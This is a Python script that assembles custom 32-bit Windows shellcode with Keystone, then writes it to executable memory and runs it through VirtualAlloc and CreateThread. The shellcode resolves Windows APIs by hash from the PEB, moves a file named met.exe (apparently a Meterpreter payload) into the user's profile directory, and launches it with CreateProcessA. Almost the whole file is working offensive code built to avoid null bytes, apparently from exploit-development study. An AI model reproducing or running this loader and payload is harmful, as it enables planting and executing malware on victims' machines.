import ctypes, struct
import os
from keystone import *

def main():
    
    SHELLCODE = (
    " start:                             "  #
      #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "  #
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module

    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "  #
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;"  #

    " find_function_shorten_bnc:         "  #
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #

    " find_function_compare:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #
    
                  
    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage
    "   push 0xa4048954                 ;"  #   MoveFileA hash 
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x24], eax           ;"  #   Save MoveFileA hash
    
    
    " load_kernelbase:                   "
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   mov   ax, 0x6c6c                ;"
    "   push  eax                       ;"
    "   push  0x642e6573                ;"  #   Push EAX on the stack with string NULL terminator
    "   push  0x61626c65                ;"  #   Push part of the string on the stack
    "   push  0x6e72656b                ;"  #   Push another part of the string on the stack
    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA
    
    " resolve_symbols_kernelbase:        "
    "   mov   ebx, eax                  ;"  #   Move the base address of kernelbase.dll to EBX
    "   push 0x591ea70f                 ;"  #   OpenProcessToken hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x40], eax           ;"  #   Save OpenProcessToken hash
    
    " load_userenv:                      "
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   mov   ecx, 0xff93939c           ;"  #   -0x006c6c64 to avoid null bytes (end of string in ax) 
    "   neg   ecx                       ;"  #   Negate ECX to revert to original (0xff93939c -> 0x006c6c64)
    "   push  ecx                       ;"  #   Move the end of the string in AX
    #"   push  0x006c6c64               ;"  #   Move the end of the string in AX
    "   push  0x2e766e65                ;"  #   Push part of the string on the stack
    "   push  0x72657375                ;"  #   Push another part of the string on the stack
    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA
    
    " resolve_symbols_userenv:           "
    "   mov   ebx, eax                  ;"  #   Move the base address of userenv.dll to EBX
    "   push 0xf2ea3914                 ;"  #   GetUserProfileDirectoryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x32], eax           ;"  #   Save GetUserProfileDirectoryA hash

    " call_open_process_token:           "
    
    "   lea  esi, [ebp+0x48]            ;"
    "   push esi                        ;"  #   [ebp+0x48] = memory address for htoken
    "   push 0x8                        ;"  #   Token query constant
    "   push 0xffffffff                 ;"  #   Current Process Handle (-1)
    "   call dword ptr [ebp+0x40]       ;"  #   Call OpenProcessToken()
    "   mov  edi, [ebp+0x48]            ;"
    
    " call_getuserprofiledirectory:      "
    "   int3                            ;"
    #"   mov dword ptr [ebp+0x1de], 0xfffffefc;" # -0x104 = 0xfffffefc
    "   xor edx, edx                    ;"
    "   add edx, 0xfffffefc             ;"
    "   neg edx                         ;"  # 0x104 = edx
    "   xor ecx, ecx                    ;"
    "   add ecx, 0xfffffe22             ;"
    "   neg ecx                         ;"  # 0x1de = ecx
    "   mov eax, ebp                    ;"  # eax = ebp
    "   add eax, ecx                    ;"  # ecx + eax = ebp+0x1de at eax
    "   mov [eax], edx                  ;"  # mov 0x104 into [ebp+0x1de]
    "   push eax                        ;"  # Push pointer to DWORD dirSize = 0x104
    "   xor ecx, ecx                    ;"
    "   add ecx, 0xfffffe1e             ;"
    "   neg ecx                         ;"  # # 0x1e2 = ecx
    "   mov ebx, ebp                    ;"  # ebp in eax
    "   add ebx, ecx                    ;"  # add 0x1de to ebp within eax.
    "   push ebx                        ;"  #   Profile Directory Buffer
    "   mov eax, [ebp+0x48]             ;"  #   load [ebp+0x48] = htoken memory address
    "   push eax                        ;"  #   Push the actual handle, [ebp+0x48] = htoken memory address
    "   call dword ptr [ebp+0x32]       ;"
    
    " call_MoveFileA:                          "  # MoveFile(source, destination)
    #"   lea  ecx, [ebp+0x1e2]                 ;"
    "   mov dword ptr [ebx+0x10], 0x74656d5c ;" # "tem\"
    "   mov dword ptr [ebx+0x14], 0x6578652e ;" # "exe."
    "   push ebx                              ;" # Destination file = profile directory + "C:\users\exploit\met.exe"
    "   xor edx, edx                    ;"
    "   add edx, 0xfffffefc             ;"
    "   neg edx                         ;"  # 0x104 = edx
    "   xor ecx, ecx                    ;"
    "   add ecx, 0xfffffdf8             ;"
    "   neg ecx                         ;"  # -0x1de = ecx
    "   mov eax, ebp                    ;"  # eax = ebp
    "   add eax, ecx                    ;"  # ecx + eax = ebp+0x208 at eax
    #"   mov dword ptr [eax], 0x5c5c3a43 ;" # Source File = C:\\Temp\met.exe (Null bytes)
    "   mov ecx, 0x5c5c3a43             ;"
    "   mov [eax], ecx                  ;"
    "   mov dword ptr [eax+0x4], 0x706d6554 ;"
    "   mov dword ptr [eax+0x8], 0x74656d5c ;" # tem\
    "   mov dword ptr [eax+0xc], 0x6578652e ;" # "exe."
    #"   lea eax, [ebp+0x208]            ;"
    "   push eax                        ;"  # Source file = smbshare in C: "\\\\kali\\shared\\met.exe";
    "   call dword ptr [ebp+0x24]       ;"  # Call MoveFileA()
    
    " create_startupinfo:                "  #
    "   xor   eax, eax                       ;"  
    "   push  eax                       ;"  #   Push hStdError
    "   push  eax                       ;"  #   Push hStdOutput
    "   push  eax                       ;"  #   Push hStdInput
    "   push  eax                       ;"  #   Push lpReserved2
    "   push  eax                       ;"  #   Push cbReserved2 & wShowWindow
    "   mov   al, 0x80                  ;"  #   Move 0x80 to AL
    "   xor   ecx, ecx                  ;"  #   NULL ECX
    "   mov   cl, 0x80                  ;"  #   Move 0x80 to CX, changed CX to CL to remove Null byte
    "   add   eax, ecx                  ;"  #   Set EAX to 0x100
    "   push  eax                       ;"  #   Push dwFlags
    "   xor   eax, eax                  ;"  #   NULL EAX   
    "   push  eax                       ;"  #   Push dwFillAttribute
    "   push  eax                       ;"  #   Push dwYCountChars
    "   push  eax                       ;"  #   Push dwXCountChars
    "   push  eax                       ;"  #   Push dwYSize
    "   push  eax                       ;"  #   Push dwXSize
    "   push  eax                       ;"  #   Push dwY
    "   push  eax                       ;"  #   Push dwX
    "   push  eax                       ;"  #   Push lpTitle
    "   push  eax                       ;"  #   Push lpDesktop
    "   push  eax                       ;"  #   Push lpReserved
    "   mov   al, 0x44                  ;"  #   Move 0x44 to AL        
    "   push  eax                       ;"  #   Push cb        
    "   push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
    "   pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI
    
    " call_createprocess:                "  #
    "   mov   eax, esp                  ;"  #   Move ESP to EAX               
    "   xor   ecx, ecx                  ;"  #   NULL ECX
    "   mov   cl, 0x390                 ;"  #   Move 0x390 to CX, changed to CL to avoid null byte
    "   sub   eax, ecx                  ;"  #   Substract CX from EAX to avoid overwriting the structure later
    "   push  eax                       ;"  #   Push lpProcessInformation
    "   push  edi                       ;"  #   Push lpStartupInfo
    "   xor   eax, eax                  ;"  #   NULL EAX   
    "   push  eax                       ;"  #   Push lpCurrentDirectory
    "   push  eax                       ;"  #   Push lpEnvironment
    "   push  eax                       ;"  #   Push dwCreationFlags
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE) 
    "   push  eax                       ;"  #   Push bInheritHandles
    "   dec   eax                       ;"  #   NULL EAX
    "   push  eax                       ;"  #   Push lpThreadAttributes
    "   push  eax                       ;"  #   Push lpProcessAttributes
    "   push  eax                       ;"  #   Push lpCommandLine
    "   xor ecx, ecx                    ;"
    "   add ecx, 0xfffffe1e             ;"
    "   neg ecx                         ;"  # # 0x1e2 = ecx
    "   xor ebx, ebx                    ;"
    "   mov ebx, ebp                    ;"
    "   add ebx, ecx                    ;"
    #"   lea ebx, [ebp+0x1e2]            ;" # Null bytes present
    "   push  ebx                       ;"  #   Push lpApplicationName
    "   call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA
    
    " terminateprocess:                  "  #
    #"   push 0x0                        ;"  # Exit Code = 0 = null bytes
    "   xor eax, eax                    ;"
    "   push eax                        ;"
    "   push 0xffffffff                 ;"  # Current process handle = -1
    "   call dword ptr [ebp+0x10]       ;"  # Call terminateProcess()   
)

    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(SHELLCODE)

    sh = b""
    output = ""
    for opcode in encoding:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode


    shellcode = bytearray(sh)
    print("Shellcode: " + output )


    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    #ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t )
    #ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) )

    va = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(shellcode)),
        ctypes.c_int(0x3000),
        ctypes.c_int(0x40))
    
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_void_p(va),
        buff,
        ctypes.c_int(len(shellcode)))
    
    print("Shellcode located at address %s" % hex(va))
    input("...ENTER TO EXECUTE SHELLCODE...")

    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.c_void_p(va),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);

if __name__ == "__main__":
    main()
